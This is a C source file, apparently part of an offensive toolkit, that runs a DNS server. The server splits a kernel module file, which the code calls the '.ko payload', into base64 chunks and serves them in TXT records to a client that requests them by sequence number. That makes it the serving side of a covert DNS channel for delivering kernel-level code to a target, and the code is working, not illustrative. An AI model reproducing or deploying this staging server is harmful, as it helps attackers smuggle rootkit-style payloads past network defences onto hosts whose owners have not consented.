#define _POSIX_C_SOURCE 200809L

#include "dns.h"

#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/**
 * @brief Base64-encode @p in_len bytes from @p in into @p out.
 *
 * @p out must be at least ceil(in_len / 3) * 4 + 1 bytes.
 *
 * @param in      Input buffer.
 * @param in_len  Number of bytes to encode.
 * @param out     Output buffer (null-terminated on return).
 * @return        Number of base64 characters written (excluding null).
 */
static size_t b64_encode(const uint8_t *in, size_t in_len, char *out)
{
    size_t i;
    size_t j = 0;
    uint8_t a, b, c;

    for (i = 0; i < in_len; i += 3) {
        a = in[i];
        b = (i + 1 < in_len) ? in[i + 1] : 0;
        c = (i + 2 < in_len) ? in[i + 2] : 0;

        out[j++] = b64_table[a >> 2];
        out[j++] = b64_table[((a & 0x3) << 4) | (b >> 4)];
        out[j++] = (i + 1 < in_len) ? b64_table[((b & 0xf) << 2) | (c >> 6)]
                                     : '=';
        out[j++] = (i + 2 < in_len) ? b64_table[c & 0x3f] : '=';
    }
    out[j] = '\0';
    return j;
}

/**
 * @brief Decode the first label of a DNS QNAME into @p out.
 *
 * DNS names are length-prefixed labels. This extracts the first label
 * (the sequence number in our protocol) from the query section.
 *
 * @param qname  Pointer to the start of the QNAME field.
 * @param out    Output buffer for the first label string.
 * @param out_sz Size of out.
 */
static void dns_first_label(const uint8_t *qname, char *out, size_t out_sz)
{
    uint8_t len = qname[0];

    if (len == 0 || len >= out_sz)
        len = (uint8_t)(out_sz - 1);

    memcpy(out, qname + 1, len);
    out[len] = '\0';
}

/**
 * @brief Build a DNS TXT response packet.
 *
 * Constructs a minimal DNS response with one TXT answer record
 * containing @p txt_data.
 *
 * @param query    Original DNS query buffer.
 * @param qlen     Length of query.
 * @param txt_data TXT record payload string.
 * @param out      Output buffer for the response packet.
 * @param out_sz   Size of out.
 * @return         Length of the response packet, or -1 on error.
 */
static int dns_build_txt_response(const uint8_t *query, size_t qlen,
                                  const char *txt_data,
                                  uint8_t *out, size_t out_sz)
{
    size_t   txt_len = strlen(txt_data);
    size_t   needed;
    uint16_t val;
    size_t   qname_len;
    size_t   off;

    if (txt_len > 255)
        return -1;

    qname_len = qlen - 12 - 4;
    needed    = 12 + qname_len + 4 + 2 + 2 + 2 + 4 + 2 + 1 + txt_len;
    if (needed > out_sz)
        return -1;

    memcpy(out, query, 12);
    out[2] = 0x84; /* QR=1, AA=1 */
    out[3] = 0x00;
    out[6] = 0x00;
    out[7] = 0x01;

    off = 12;

    memcpy(out + off, query + 12, qname_len + 4);
    off += qname_len + 4;

    out[off++] = 0xC0;
    out[off++] = 0x0C;

    val = htons(16);
    memcpy(out + off, &val, 2); off += 2;

    val = htons(1);
    memcpy(out + off, &val, 2); off += 2;

    memset(out + off, 0, 4); off += 4;

    val = htons((uint16_t)(1 + txt_len));
    memcpy(out + off, &val, 2); off += 2;

    out[off++] = (uint8_t)txt_len;
    memcpy(out + off, txt_data, txt_len);
    off += txt_len;

    return (int)off;
}

/**
 * @brief Serve the .ko payload as DNS TXT record responses.
 *
 * Loads @p ko_path, splits it into DNS_CHUNK_SIZE-byte chunks and serves
 * them base64-encoded in TXT records. Responds to seq=0 with the total
 * chunk count, and to seq=N (N>=1) with chunk N-1.
 *
 * @param port     UDP port to listen on (typically 53).
 * @param ko_path  Path to the .ko file to serve.
 * @return         0 when all chunks delivered, -1 on error.
 */
int dns_serve_payload(uint16_t port, const char *ko_path)
{
    struct sockaddr_in addr;
    struct sockaddr_in peer;
    socklen_t          peer_len = sizeof(peer);
    int                sock;
    int                opt = 1;
    FILE              *f;
    uint8_t           *ko_buf;
    long               ko_sz;
    int                total_chunks;
    int                delivered;
    uint8_t            query[512];
    uint8_t            resp[1024];
    char               b64_chunk[DNS_CHUNK_SIZE * 2];
    ssize_t            n;
    int                resp_len;
    char               seq_str[32];
    char               txt[256];
    int                seq;

    f = fopen(ko_path, "rb");
    if (!f)
        return -1;

    fseek(f, 0, SEEK_END);
    ko_sz = ftell(f);
    rewind(f);

    if (ko_sz <= 0) {
        fclose(f);
        return -1;
    }

    ko_buf = malloc((size_t)ko_sz);
    if (!ko_buf) {
        fclose(f);
        return -1;
    }

    if ((long)fread(ko_buf, 1, (size_t)ko_sz, f) != ko_sz) {
        fclose(f);
        free(ko_buf);
        return -1;
    }
    fclose(f);

    total_chunks = (int)((ko_sz + DNS_CHUNK_SIZE - 1) / DNS_CHUNK_SIZE);

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        free(ko_buf);
        return -1;
    }

    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons(port);

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        free(ko_buf);
        return -1;
    }

    printf("[*] dns server on udp:%u — %d chunks to serve\n",
           port, total_chunks);

    delivered = 0;

    while (delivered < total_chunks) {
        n = recvfrom(sock, query, sizeof(query), 0,
                     (struct sockaddr *)&peer, &peer_len);
        if (n < 12)
            continue;

        dns_first_label(query + 12, seq_str, sizeof(seq_str));
        seq = atoi(seq_str);

        if (seq == 0) {
            snprintf(txt, sizeof(txt), "%d", total_chunks);
        } else {
            int    idx    = seq - 1;
            size_t offset = (size_t)idx * DNS_CHUNK_SIZE;
            size_t chunk_len;

            if (idx >= total_chunks || offset >= (size_t)ko_sz) {
                continue;
            }

            chunk_len = (size_t)ko_sz - offset;
            if (chunk_len > DNS_CHUNK_SIZE)
                chunk_len = DNS_CHUNK_SIZE;

            b64_encode(ko_buf + offset, chunk_len, b64_chunk);
            snprintf(txt, sizeof(txt), "%s", b64_chunk);
            delivered++;
        }

        resp_len = dns_build_txt_response(query, (size_t)n,
                                          txt, resp, sizeof(resp));
        if (resp_len > 0)
            sendto(sock, resp, (size_t)resp_len, 0,
                   (struct sockaddr *)&peer, peer_len);
    }

    close(sock);
    free(ko_buf);
    return 0;
}
